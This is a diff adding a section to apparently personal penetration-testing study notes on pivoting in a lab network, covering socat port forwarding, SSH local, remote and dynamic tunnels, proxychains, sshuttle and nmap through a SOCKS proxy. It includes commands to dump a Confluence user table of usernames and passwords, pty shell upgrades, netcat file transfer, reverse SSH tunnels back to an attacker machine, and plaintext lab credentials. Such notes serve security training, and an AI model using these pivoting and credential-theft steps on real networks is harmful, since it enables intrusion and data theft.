@@ -1917,3 +1917,162 @@ gcc cve-2017-16995.c -o cve-2017-16995
 PwnKit can be used for privesc on many kernels
 
 https://www.exploit-db.com/exploits/50689
+
+
+## Port Redirection and SSH Tunneling
+### Linux
+get network interfaces
+```
+ip addr
+```
+
+get routes
+```
+ip route
+```
+
+use socat to set up port forwarding
+On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. It will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432).
+
+```
+socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+```
+
+now we can run psql client through the port forward
+```
+psql -h 192.168.50.63 -p 2345 -U postgres
+```
+
+on postgres the cwd_user table contains username and password
+```
+\c confluence
+select * from cwd_user;
+```
+
+### SSH Local Port Forwarding
+python tty shell
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+if port scanner not included we can do a bash for loop to discover services
+```
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
+```
+
+A local port forward can be set up using OpenSSH's -L option, which takes two sockets (in the format IPADDRESS:PORT) separated with a colon as an argument (e.g. IPADDRESS:PORT:IPADDRESS:PORT). The first socket is the listening socket that will be bound to the SSH client machine. The second socket is where we want to forward the packets to. The rest of the SSH command is as usual - pointed at the SSH server and user we wish to connect as.
+
+Let's create the SSH connection from CONFLUENCE01 to PGDATABASE01 using ssh, logging in as database_admin. We'll pass the local port forwarding argument we just put together to -L, and use -N to prevent a shell from being opened.
+```
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+```
+
+use ss to check ssh sessions
+```
+ss -ntplu
+```
+
+SMB get shares
+```
+smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome123
+smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
+```
+
+netcat for file transfers
+On the receiving end running,
+```
+nc -l -p 1234 > out.file
+```
+will begin listening on port 1234.
+
+On the sending end running,
+```
+nc -w 3 [destination] 1234 < out.file
+```
+will connect to the receiver and begin sending file.
+
+### Dynamic Port Forwarding
+
+Allows one listening socket to forward to multiple machines / ports
+
+need a tty shell for this
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+In OpenSSH, a dynamic port forward is created with the -D option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We don't have to specify a socket address to forward to. We'll also pass the -N flag to prevent a shell from being spawned.
+
+```
+ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+```
+
+Proxychains is a tool that can force network traffic from third party tools over HTTP or SOCKS proxies.
+Proxychains uses a configuration file for almost everything, stored by default at /etc/proxychains4.conf. 
+```
+socks5 192.168.50.63 9999
+```
+
+prepend proxychains to command. also change host to final target host
+```
+proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+```
+
+Let's escalate this and port scan HRSHARES through our SOCKS proxy using Nmap. We'll use a TCP-connect scan (-sT), skip DNS resolution (-n), skip the host discovery stage (-Pn) and only check the top 20 ports (--top-ports=20)
+
+```
+proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
+```
+
+### SSH Remote Port Forwarding
+have reverse shell ssh back to us then we forward packets from our machine
+first need to start ssh
+```
+sudo systemctl start ssh
+sudo ss -ntplu
+```
+
+In order to connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting PasswordAuthentication to yes in /etc/ssh/sshd_config.
+
+use pty shell then setup remote port forwarding
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+```
+
+On our Kali machine, we will use psql, passing 127.0.0.1 as the host (-h), 2345 as the port (-p), and using the database credentials of the postgres user (-U) we found earlier on CONFLUENCE01.
+
+```
+psql -h 127.0.0.1 -p 2345 -U postgres
+```
+
+### Remote Dynamic Port Forwarding
+The remote dynamic port forwarding command is relatively simple, although (slightly confusingly) it uses the same -R option as classic remote port forwarding. The difference is that when we want to create a remote dynamic port forward, we pass only one socket: the socket we want to listen on the SSH server. We don't even need to specify an IP address; if we just pass a port, it will be bound to the loopback interface of the SSH server by default.
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+ssh -N -R 9998 kali@192.168.118.4
+sudo ss -ntplu
+```
+
+then add `tail /etc/proxychains4.conf` to `/etc/proxychains4.conf`
+
+can then run nmap like before
+```
+proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
+```
+### Sshuttle
+
+ sshuttle1 is a tool that turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel. However, it requires root privileges on the SSH client and Python3 on the SSH server, so it's not always the most lightweight option. In the appropriate scenario, however, it can be very useful.
+
+first set up local port forwarding on server
+```
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+```
+
+then on kali machine tell sshuttle which routes to go through ssh tunnel
+```
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+```
+now we an act as though we have access to new host
+```
+smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
+```
